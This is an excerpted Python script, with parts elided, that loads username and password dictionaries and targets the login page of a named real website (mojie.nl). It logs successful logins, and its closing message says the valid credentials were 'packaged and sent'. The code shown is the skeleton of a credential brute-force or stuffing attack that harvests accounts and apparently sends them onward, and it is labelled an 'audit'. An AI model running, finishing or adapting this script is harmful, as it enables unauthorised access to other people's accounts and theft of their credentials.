...
RESULT_FILE_PATH = "success_log3.txt"
SUMMARY_TXT_PATH = "success_summary3.txt"
...
def get_accounts():
    """直接读取本地 users3.txt 文件"""
    if os.path.exists("users3.txt"):
        with open("users3.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []

def get_passwords():
    """直接读取本地 passwords3.txt 文件"""
    if os.path.exists("passwords3.txt"):
        with open("passwords3.txt", "r", encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip() and not line.startswith("#")]
    return []
...
def main():
    ...
    if not usernames or not passwords:
        print("[!] 错误：未找到有效的账号字典(users3.txt)或密码字典(passwords3.txt)！")
        return
    ...
    with requests.Session() as session:
        session.headers.update({
            ...
            "Origin": "https://mojie.nl",
            "Referer": "https://mojie.nl/auth/login"
        })
    ...
    print(f"\n[*] 全自动审计结束，共 {len(successful_results)} 个有效凭据并已打包发送。")
